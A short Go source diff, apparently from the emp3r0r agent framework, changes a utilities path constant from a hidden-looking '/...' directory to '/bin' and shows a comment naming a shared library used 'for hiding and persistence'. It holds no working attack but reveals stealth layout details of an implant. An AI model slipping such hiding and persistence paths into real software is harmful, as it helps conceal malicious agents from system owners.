@@ -46,7 +46,7 @@ const (
 	AgentRoot = "[agent_root]"
 
 	// UtilsPath binary path of utilities
-	UtilsPath = AgentRoot + "/..."
+	UtilsPath = AgentRoot + "/bin"
 
 	// Libemp3r0rFile shard library of emp3r0r, for hiding and persistence
 	Libemp3r0rFile = UtilsPath + "/libemp3r0r.so"
